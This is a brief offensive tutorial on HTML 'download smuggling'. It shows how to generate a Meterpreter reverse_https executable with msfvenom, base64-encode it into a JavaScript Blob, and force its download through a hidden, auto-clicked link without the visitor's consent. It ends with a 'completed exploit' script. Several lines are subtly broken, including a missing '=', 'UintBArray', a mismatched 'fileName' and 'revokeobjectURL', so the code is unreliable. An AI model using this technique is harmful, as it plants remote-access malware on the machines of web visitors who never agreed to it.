# Download Smuggling with Javascript
Store a malicious file in memory and force a download without user consent. 

## 1. Meterpreter Executable
Create a base64 executable and store it as a blob inside a js variable.
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o /var/www/html/msfstaged.exe

base64 /var/www/html/msfstaged.exe
```
Note: Make sure there are no line breaks or spaces!

```
<script>
var file = <BASE64String>
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var filename = 'msfstaged.exe';
</script>
```

## 2. Create hidden link
Create a download link for our payload and append it to the page.
```js
var a document.createElement('a');
document.body.appendChild(a);
a.style = 'display:none';
var url = window.URL.createObjectURL(blob);
a.href = url;
```

## 3. Force a click
```js
a.download = filename;
a.click();
window.URL.revokeObjectURL(url);
```

## 3. Base64 Encoding
We'll need to encode (prevent invalid chars) and decode our payload in order to perform this attack.
```sh
function base64ToArrayBuffer(base64) 
{
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new UintBArray(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}
```

## 4. Completed Exploit
```js
function base64ToArrayBuffer(base64) 
{
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new UintBArray(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

var file = <BASE64String>
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var filename = 'msfstaged.exe'

var a document.createElement('a');
document.body.appendChild(a);
a.style = 'display:none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeobjectURL(url);
```
